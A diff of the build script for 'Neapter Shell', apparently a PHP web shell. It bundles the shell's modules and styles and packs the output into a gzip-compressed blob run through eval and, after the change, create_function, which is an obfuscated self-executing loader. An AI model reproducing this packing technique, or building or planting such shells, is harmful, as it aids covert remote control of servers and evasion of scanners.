@@ -4,7 +4,7 @@
  * Neapter Shell
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2012, Krzysztof Otręba
+ * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
  *
  * @license   http://www.gnu.org/licenses/gpl-3.0.txt
  */
@@ -76,17 +76,30 @@ switch ($sType) {
             'Lib/Request',
             'Lib/ModuleAbstract',
             'Lib/XRecursiveDirectoryIterator',
-            'Lib/Args'
+            'Lib/Args',
+            'Lib/Utils'
         );
 
-        if ($sType !== 'lite') {
-            $oDirectory = new DirectoryIterator(__DIR__ . '/Modules');
+        $sPath = __DIR__ . '/Modules';
 
-            foreach ($oDirectory as $oFile) {
-                if ($oFile->isFile() && ($oFile->getFilename() !== 'Dummy.php')) {
-                    $aFiles[] = 'Modules/' . basename($oFile->getPathname(), '.php');
+        $oDirectory = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($sPath)
+        );
+
+        foreach ($oDirectory as $oFile) {
+            if ($oFile->isFile() && ($oFile->getFilename() !== 'Dummy.php')) {
+                $aFiles[] = 'Modules' . substr($oFile->getPathname(), strlen($sPath), -4);
+            }
+        }
+
+        if ($sType === 'lite') {
+            foreach ($aFiles as &$sFile) {
+                if (!preg_match('~^(Lib/)|(Modules/Basic/)~', $sFile)) {
+                    $sFile = null;
                 }
             }
+
+            $aFiles = array_filter($aFiles);
         }
 
         $aFiles[] = 'shell';
@@ -116,14 +129,14 @@ switch ($sType) {
                 /**
                  * Wyciaganie Style
                  */
-                if (!preg_match('~\$this -> sStyleSheet = file_get_contents\(\s?(.+?)\s?\);~', $sShellData, $aMatch)) {
+                if (!preg_match("~echo *file_get_contents\(dirname\(Request::getServer\('SCRIPT_FILENAME'\)\) *\. *'/Styles/(.+?)'\);~", $sShellData, $aMatch)) {
                     echo "Cos nie tak ze stylami\r\n";
                     exit;
                 }
 
-                $aMatch[1] = eval(sprintf('return %s;', $aMatch[1]));
+                $sStyleFilePath = dirname(__FILE__) . '/Styles/' . $aMatch[1];
 
-                if (!is_file($aMatch[1])) {
+                if (!is_file($sStyleFilePath)) {
                     echo "Plik ze stylami nie istnieje\r\n";
                     exit;
                 }
@@ -131,8 +144,9 @@ switch ($sType) {
                 /**
                  * Style uzytkownika
                  */
-                if ((($sStyleFilePath = $oArgs->getOption('css')) !== FALSE) && !$oArgs->getOption('no-css')) {
-                    $sStyleFilePath = dirname(__FILE__) . '/Styles/' . basename($sStyleFilePath) . '.css';
+                if ((($sStyleUserFilePath = $oArgs->getOption('css')) !== FALSE) && !$oArgs->getOption('no-css')) {
+                    $sStyleFilePath = dirname(__FILE__) . '/Styles/' . basename($sStyleUserFilePath) . '.css';
+
                     if (!is_file($sStyleFilePath)) {
                         printf("Plik ze stylami '%s' nie istnieje\r\n", $sStyleFilePath);
                         exit;
@@ -142,12 +156,9 @@ switch ($sType) {
                 /**
                  * Podmienianie styli
                  */
-                $sShellData = preg_replace('~\$this -> sStyleSheet = file_get_contents\((.+?)\);~', NULL, $sShellData);
-                $sShellData = preg_replace('~private \$StyleSheet;~', '', $sShellData);
-                $sShellData = preg_replace('~{\$this -> sStyleSheet}~',
-                    preg_replace('~[\r\n\t]+~', NULL, ($oArgs->getOption('no-css') ? '' : file_get_contents($sStyleFilePath ?: $aMatch[1]))),
-                    $sShellData
-                );
+                $sStyleContent = preg_replace('~[\r\n\t]+~', NULL, ($oArgs->getOption('no-css') ? '' : file_get_contents($sStyleFilePath)));
+
+                $sShellData = preg_replace("~file_get_contents\(dirname\(Request::getServer\('SCRIPT_FILENAME'\)\) *\. *'/Styles/haxior\.css'\);~", var_export($sStyleContent, true), $sShellData);
 
                 $sData .= $sShellData;
             } else {
@@ -176,7 +187,7 @@ if ($sType !== 'modules') {
      */
     if (isset($aFiles) && in_array('shell', $aFiles)) {
         $sJs = $oArgs->getOption('no-js') ? '' : file_get_contents('LibProd/js.js');
-        $sData = preg_replace('~\$sScript\s*=\s*file_get_contents\(.+?\'/Lib/js.js\'\s*\);~', '$sScript=' . var_export($sJs, TRUE) . ';', $sData);
+        $sData = preg_replace("~file_get_contents\(dirname\(Request::getServer\('SCRIPT_FILENAME'\)\) *. *'/Lib/js.js'\);~", var_export($sJs, TRUE) . ';', $sData);
     }
 
     /**
@@ -230,6 +241,21 @@ $aReplace = array
     "\r" => '\r',
     "\t" => '\t',
 );
+
+/**
+ * Small optimization. Replace private and protected to public
+ *
+ * Save 265 bytes in prod.php file
+ * Save 120 bytes in final.php file
+ */
+function protected2public($token)
+{
+    if ($token == 'protected' || $token  == 'private') {
+        return 'public';
+    }
+
+    return $token;
+}
 
 foreach ($aTokens as $i => $aToken) {
     if (in_array($i, $aExclude)) {
@@ -285,9 +311,9 @@ foreach ($aTokens as $i => $aToken) {
 
 
             if (in_array(trim(strtolower($aToken[1])), $aInclude)) {
-                $sOutput .= $aToken[1] . ' ';
+                $sOutput .= protected2public($aToken[1]) . ' ';
             } else {
-                $sOutput .= $aToken[1];
+                $sOutput .= protected2public($aToken[1]);
             }
     }
 }
@@ -300,8 +326,8 @@ $sData = trim($sOutput);
 
 file_put_contents(__DIR__ . '/Tmp/prod.php', $sData);
 
-$sData = '?>' . $sData . '<?';
+$sData = substr(rtrim($sData), 6, -2);
 
 $sFile = __DIR__ . '/Tmp/' . ((isset($argv[1]) && ($argv[1] === 'modules')) ? 'modules.txt' : 'final.php');
 
-file_put_contents($sFile, sprintf('<?php $_=%s; eval(gzuncompress($_));?>', var_export(gzcompress($sData, 9), 1)));
+file_put_contents($sFile, sprintf('<?php $_=%s; $__=create_function("", gzuncompress($_));$__();?>', var_export(gzcompress($sData, 9), 1)));
